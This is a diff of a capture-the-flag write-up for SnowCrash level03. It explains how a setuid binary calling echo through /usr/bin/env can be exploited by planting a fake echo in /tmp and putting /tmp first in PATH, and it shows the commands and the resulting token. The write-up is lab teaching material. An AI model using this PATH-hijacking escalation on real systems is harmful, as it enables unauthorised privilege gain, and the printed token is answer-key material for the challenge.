@@ -1,4 +1,4 @@
-## Level 03
+# Level 03
 
 ### linux privilege escalation using path variable
 
@@ -37,7 +37,9 @@ void main(void)
 
 To put it simply; it sets the group and user as the one used when the program is executed, here `flag03`. Then it spawns a process using `system()`. It will try to use echo given in the `/usr/bin/env` list which is what interests us.
 
-Using this piece of information and [this](https://blog.creekorful.org/2020/09/setuid-privilege-escalation/) wonderful article, we can then create a fake `echo` and add it at the start of our path. What will hapen is that, when we execute `level03`, `echo` will be replaced by our custom [echo](./echo) and executed as `flag03` and not as `level03`. It means that we can use it to replace echo with a simple `getflag`.
+## Exploit
+
+Using this piece of information we can then create a fake `echo` and add it at the start of our path. What will hapen is that, when we execute `level03`, `echo` will be replaced by our custom [echo](./echo) and executed as `flag03` and not as `level03`. It means that we can use it to replace echo with a simple `getflag`.
 
 ```
 echo "/bin/sh -c 'getflag'" > /tmp/echo
@@ -45,10 +47,13 @@ chmod 755 /tmp/echo
 export PATH=/tmp:$PATH
 ```
 
-And voilà! We got a token!
-
-### Token
 ```
 level03@SnowCrash:~$ ./level03
 Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
 ```
+
+And voilà! We got a token!
+
+## Token
+
+qi0maab88jeaj46qoumi7maus
